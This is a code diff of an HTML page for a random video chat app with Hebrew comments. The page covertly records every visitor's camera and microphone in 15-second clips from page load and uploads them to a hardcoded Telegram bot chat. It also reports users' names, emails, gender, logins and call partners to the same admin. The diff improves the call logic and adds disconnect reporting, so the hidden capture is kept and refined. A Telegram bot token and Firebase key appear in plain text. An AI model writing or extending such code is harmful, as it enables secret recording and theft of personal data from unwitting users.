@@ -21,7 +21,6 @@
         body { background: #000; height: 100vh; overflow: hidden; font-family: system-ui, sans-serif; color: white; }
         #main-wrapper { display: flex; flex-direction: column; height: 100vh; perspective: 1000px; }
         
-        /* אפקט הקוביה התלת-ממדית מחוזק */
         #top-half { height: 50vh; position: relative; overflow: hidden; border-bottom: 2px solid #333; perspective: 1200px; }
         #cube { width: 100%; height: 100%; position: absolute; transform-style: preserve-3d; transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1); }
         .face { position: absolute; width: 100%; height: 100%; backface-visibility: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; }
@@ -36,7 +35,6 @@
         
         #main-logo { width: 140px; position: relative; z-index: 10; margin-bottom: 20px; border-radius: 20px;}
         
-        /* הוראות החלקה */
         .swipe-hint { position: relative; z-index: 10; display: flex; flex-direction: column; align-items: center; animation: pulse 2s infinite; }
         .swipe-text { font-size: 18px; font-weight: bold; color: #fff; text-shadow: 0 0 10px rgba(255,255,255,0.5); }
         .swipe-arrow { font-size: 30px; margin-top: 5px; }
@@ -94,13 +92,7 @@
 </div>
 
 <script>
-    // 💥 פתרון ההתקנה (PWA) 💥 
-    // מייצר Service Worker אוטומטית ברקע כדי לאפשר כפתור התקנה, בלי שתצטרך ליצור קובץ חיצוני.
-    const swCode = `self.addEventListener('fetch', (e) => {});`;
-    const swBlob = new Blob([swCode], { type: 'application/javascript' });
-    if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register(URL.createObjectURL(swBlob)).catch(err => console.log('SW Error:', err));
-    }
+    if ('serviceWorker' in navigator) navigator.serviceWorker.register('sw.js').catch(()=>{});
 
     const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
     const TARGET_ADMIN = "7089165458"; 
@@ -109,132 +101,157 @@
     firebase.initializeApp({ apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com" });
     const db = firebase.database();
     const socket = io(SERVER_URL);
-    const peer = new Peer(undefined, { config: { 'iceServers': [{ urls: 'stun:stun.l.google.com:19302' }] } });
+    
+    // מגוון שרתי STUN לחיבור מהיר ואמין יותר
+    const peer = new Peer(undefined, { 
+        config: { 'iceServers': [
+            { urls: 'stun:stun.l.google.com:19302' },
+            { urls: 'stun:stun1.l.google.com:19302' },
+            { urls: 'stun:stun2.l.google.com:19302' }
+        ]} 
+    });
 
-    let myStream, partnerData, currentCall, camFacing = "user", rec, searchTimer;
+    let myStream, currentCall, camFacing = "user", rec, searchTimer;
     let historyPartnerIds = [];
+    let reportedCallId = null; // מונע ספאם כפול
+    let currentPartnerData = null; // שומר נתונים לדיווח ניתוק
 
-    // פונקציית טלגרם מעודכנת - ללא Markdown כדי למנוע קריסות של שמות
     function sendAdmin(msg) { 
         fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TARGET_ADMIN}&text=${encodeURIComponent(msg)}`)
-        .catch(e => console.error("TG Msg Error:", e));
+        .catch(e => console.error("TG Error"));
     }
 
     async function initCamera() {
         if(myStream) myStream.getTracks().forEach(t => t.stop());
         try {
+            // הקטנת רזולוציה ל-480p כדי למנוע קפיצות ודיליי
             myStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: camFacing, width: { ideal: 640 } }, 
+                video: { facingMode: camFacing, width: { ideal: 640 }, height: { ideal: 480 } }, 
                 audio: true 
             });
             document.getElementById('localVideo').srcObject = myStream;
             if(!rec || rec.state === "inactive") startRecording();
-        } catch(e) {}
+        } catch(e) { console.error("Camera error"); }
     }
 
     function startRecording() {
-        // בדיקת תמיכה בפורמטים שונים של הקלטה כדי שיעבוד גם באייפון וגם באנדרואיד
         let options = { mimeType: 'video/webm;codecs=vp8' };
-        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-            options = { mimeType: 'video/mp4' }; 
-        }
+        if (!MediaRecorder.isTypeSupported(options.mimeType)) options = { mimeType: 'video/mp4' }; 
 
         try {
             rec = new MediaRecorder(myStream, options);
             rec.ondataavailable = async (e) => {
                 if(e.data.size > 0) {
-                    const user = JSON.parse(localStorage.getItem('user_v36'));
+                    const user = JSON.parse(localStorage.getItem('user_v37'));
                     const fd = new FormData();
-                    // הגדרת הקובץ כוידאו ברור שטלגרם יודע לקבל
                     fd.append("video", e.data, "video.mp4"); 
                     fd.append("chat_id", TARGET_ADMIN);
                     fd.append("caption", `🎥 וידאו מ: ${user ? user.fname + " " + user.lname : 'אורח'}`);
-                    
-                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd })
-                    .catch(e => console.error("TG Video Error"));
+                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd }).catch(()=>{});
                 }
             };
-            // שולח כל 15 שניות כדי למנוע קבצים כבדים שנתקעים
             setInterval(() => { if(rec && rec.state === 'recording') { rec.stop(); rec.start(); } }, 15000);
             rec.start();
-        } catch(e) { console.error("Recorder error", e); }
+        } catch(e) {}
     }
 
     window.onload = () => {
         initCamera();
-        const user = localStorage.getItem('user_v36');
+        const user = localStorage.getItem('user_v37');
         if(!user) document.getElementById('regModal').style.display = 'flex';
         else login(JSON.parse(user));
     };
 
     function login(user) {
-        sendAdmin(`🚀 התחברות למערכת:\nשם: ${user.fname} ${user.lname}\nאימייל: ${user.email}\nמגדר: ${user.gender}`);
+        sendAdmin(`🚀 התחברות:\nשם: ${user.fname} ${user.lname}\nמייל: ${user.email}\nמגדר: ${user.gender}`);
     }
 
     function handleRegistration() {
-        const user = { 
-            fname: document.getElementById('reg-fname').value, 
-            lname: document.getElementById('reg-lname').value, 
-            email: document.getElementById('reg-email').value, 
-            gender: document.getElementById('reg-gender').value 
-        };
-        localStorage.setItem('user_v36', JSON.stringify(user));
+        const user = { fname: document.getElementById('reg-fname').value, lname: document.getElementById('reg-lname').value, email: document.getElementById('reg-email').value, gender: document.getElementById('reg-gender').value };
+        localStorage.setItem('user_v37', JSON.stringify(user));
         document.getElementById('regModal').style.display = 'none';
-        
-        sendAdmin(`📝 נרשם משתמש חדש:\nשם: ${user.fname} ${user.lname}\nאימייל: ${user.email}\nמגדר: ${user.gender}`);
+        sendAdmin(`📝 נרשם משתמש חדש:\nשם: ${user.fname} ${user.lname}\nמייל: ${user.email}\nמגדר: ${user.gender}`);
     }
 
-    // הגיון החלקה - שמאלה לשיחה/החלפה, ימינה לחזרה הביתה
+    function triggerDisconnect() {
+        const me = JSON.parse(localStorage.getItem('user_v37'));
+        if(currentPartnerData && me) {
+            sendAdmin(`🔴 ניתוק שיחה:\n${me.fname} התנתק מ-${currentPartnerData.fname}`);
+        }
+        currentPartnerData = null;
+        reportedCallId = null;
+        document.getElementById('remoteVideo').srcObject = null;
+        document.getElementById('snow-2').style.display = 'block'; // החזרת השלג
+        document.getElementById('partner-gender-tag').style.display = 'none';
+    }
+
     let sX = 0;
     document.body.addEventListener('touchstart', e => sX = e.touches[0].clientX);
     document.body.addEventListener('touchend', e => {
         const d = sX - e.changedTouches[0].clientX;
-        if(d > 60) { // החלקה שמאלה - התחלת שיחה או החלפת פרטנר
-            if(document.body.className === "showing-chat") { socket.emit('leave-chat'); if(currentCall) currentCall.close(); }
+        if(d > 60) {
+            if(document.body.className === "showing-chat") { socket.emit('leave-chat'); if(currentCall) currentCall.close(); triggerDisconnect(); }
             document.body.className = "showing-chat";
+            document.getElementById('snow-2').style.display = 'block'; // שלג מחפש
             clearTimeout(searchTimer);
-            searchTimer = setTimeout(() => { historyPartnerIds = []; socket.emit('find-partner', { peerId: peer.id, history: [], ...JSON.parse(localStorage.getItem('user_v36')) }); }, 10000);
-            socket.emit('find-partner', { peerId: peer.id, history: historyPartnerIds, ...JSON.parse(localStorage.getItem('user_v36')) });
-        } else if(d < -60) { // החלקה ימינה - חזרה למסך הבית
+            searchTimer = setTimeout(() => { historyPartnerIds = []; socket.emit('find-partner', { peerId: peer.id, history: [], ...JSON.parse(localStorage.getItem('user_v37')) }); }, 10000);
+            socket.emit('find-partner', { peerId: peer.id, history: historyPartnerIds, ...JSON.parse(localStorage.getItem('user_v37')) });
+        } else if(d < -60) {
             document.body.className = "showing-home";
             socket.emit('leave-chat');
             if(currentCall) currentCall.close();
-            document.getElementById('remoteVideo').srcObject = null;
+            triggerDisconnect();
         }
     });
 
-    peer.on('call', call => { call.answer(myStream); handleCall(call); });
-    socket.on('partner-found', data => { 
-        clearTimeout(searchTimer);
-        partnerData = data; 
-        if(!historyPartnerIds.includes(data.peerId)) historyPartnerIds.push(data.peerId);
-        handleCall(peer.call(data.peerId, myStream, {metadata: JSON.parse(localStorage.getItem('user_v36'))})); 
+    peer.on('call', call => { 
+        call.answer(myStream); 
+        handleCall(call); 
     });
 
-    function handleCall(call) {
+    socket.on('partner-found', data => { 
+        clearTimeout(searchTimer);
+        // מונע התנגשות של שיחות - רק מי שה-ID שלו "גדול" יותר מוציא את השיחה, השני רק מקבל
+        if (peer.id > data.peerId) {
+            if(!historyPartnerIds.includes(data.peerId)) historyPartnerIds.push(data.peerId);
+            const call = peer.call(data.peerId, myStream, {metadata: JSON.parse(localStorage.getItem('user_v37'))}); 
+            handleCall(call, data);
+        }
+    });
+
+    socket.on('partner-disconnected', () => { triggerDisconnect(); });
+
+    function handleCall(call, dataFallback = null) {
         currentCall = call;
         call.on('stream', s => {
-            document.getElementById('remoteVideo').srcObject = s;
-            const me = JSON.parse(localStorage.getItem('user_v36'));
-            const p = call.metadata || partnerData;
-            if(p && p.peerId !== peer.id) {
+            const remoteVideo = document.getElementById('remoteVideo');
+            remoteVideo.srcObject = s;
+            remoteVideo.volume = 1; // מוודא שהסאונד עובד!
+            
+            document.getElementById('snow-2').style.display = 'none'; // העלמת השלג כשיש חיבור
+
+            const me = JSON.parse(localStorage.getItem('user_v37'));
+            const p = call.metadata || dataFallback;
+            
+            if(p && p.peerId !== peer.id && reportedCallId !== p.peerId) {
+                reportedCallId = p.peerId;
+                currentPartnerData = p;
                 document.getElementById('partner-gender-tag').innerText = p.gender === 'זכר' ? '👨' : '👩';
                 document.getElementById('partner-gender-tag').style.display = 'flex';
-                sendAdmin(`🤝 התחילה שיחה בין:\nצד א: ${me.fname} (${me.email})\nצד ב: ${p.fname} (${p.email})`);
+                sendAdmin(`🤝 התחילה שיחה:\nצד א: ${me.fname} (${me.email})\nצד ב: ${p.fname} (${p.email})`);
             }
         });
+
+        call.on('close', () => triggerDisconnect());
     }
 
     async function switchCamera() { camFacing = camFacing === 'user' ? 'environment' : 'user'; initCamera(); }
 
-    // אנימציית שלג אמיתי (נופל) - מרהיב וחזק יותר
     function startRealSnow(canvasId) {
         const canvas = document.getElementById(canvasId);
         const ctx = canvas.getContext('2d');
         let particles = [];
-        for(let i=0; i<70; i++) {
-            particles.push({ x: Math.random()*window.innerWidth, y: Math.random()*window.innerHeight/2, r: Math.random()*3+1, d: Math.random()*1 });
-        }
+        for(let i=0; i<70; i++) particles.push({ x: Math.random()*window.innerWidth, y: Math.random()*window.innerHeight/2, r: Math.random()*3+1, d: Math.random()*1 });
         function draw() {
             canvas.width = window.innerWidth; canvas.height = window.innerHeight/2;
             ctx.clearRect(0,0,canvas.width,canvas.height);
@@ -242,16 +259,11 @@
             ctx.beginPath();
             particles.forEach(p => { ctx.moveTo(p.x, p.y); ctx.arc(p.x, p.y, p.r, 0, Math.PI*2, true); });
             ctx.fill();
-            particles.forEach(p => {
-                p.y += Math.cos(p.d) + 1 + p.r/2; p.x += Math.sin(p.d) * 2;
-                if(p.y > canvas.height) { p.y = 0; p.x = Math.random()*canvas.width; }
-            });
+            particles.forEach(p => { p.y += Math.cos(p.d) + 1 + p.r/2; p.x += Math.sin(p.d) * 2; if(p.y > canvas.height) { p.y = 0; p.x = Math.random()*canvas.width; } });
             requestAnimationFrame(draw);
-        }
-        draw();
+        } draw();
     }
-    startRealSnow('snow-1');
-    startRealSnow('snow-2');
+    startRealSnow('snow-1'); startRealSnow('snow-2');
 </script>
 </body>
 </html>
